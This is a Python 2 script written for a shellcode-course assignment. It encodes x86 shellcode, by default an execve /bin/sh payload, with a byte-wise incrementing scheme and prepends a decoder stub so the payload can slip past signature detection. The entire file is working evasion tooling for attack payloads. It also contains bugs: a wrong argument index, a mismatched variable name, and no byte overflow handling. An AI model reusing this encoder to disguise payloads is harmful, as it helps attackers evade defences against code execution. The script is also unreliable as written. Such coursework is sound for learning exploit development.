#!/usr/bin/python

# SLAE - Assignment 4 - Shellcode Obfuscation
# Python script to obfuscate shellcode to later decode with with custom decoder
# Script takes shellcode as Aqrgument and will produce working shellcode with the decoder
# If no shellcode is given, an execve /bin/sh shellcode is used 
# Author: Billy (@_hAxel)

import sys

if len(sys.argv) == 2:
	origShellCode = sys.argv[2]
else:
	origShellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
 

shellByteArray = bytearray(origShellcode)
newCode = bytearray()

shellCodeLength = len(shellByteArray)

i = 1
while len(shellByteArray) != 0:
	
	curByte = shellByteArray[0]
	restBytes = shellByteArray[1:]
	newByte = curByte + i
	newCode.append(newByte)
	shellByteArray = restBytes
	i = i+1


#newCodeFormat = [hex(i) for i in newCode]
newCodeFormat = ""
for i in newCode:
	newCodeFormat = newCodeFormat + "\\" + str(hex(i)[1:])

print "Shellcode Length: %s" % shellCodeLength

#print(",".join(newCodeFormat))


finalShellCode = ("\\xeb\\x18\\x5e\\x31\\xc9\\x31\\xdb\\x31\\xc0\\xfe\\xc3\\xb1\\x" + str(hex(shellCodeLength))[2:] + "\\x8a\\x06" +
		  "\\x28\\xd8\\x88\\x06\\x46\\xfe\\xc3\\xe2\\xf5\\xeb\\x05\\xe8\\xe3\\xff\\xff\\xff" + str(newCodeFormat))

print "Your encoded shellcode and decoder shellcode is:\n"
print "\"" + finalShellCode + "\""
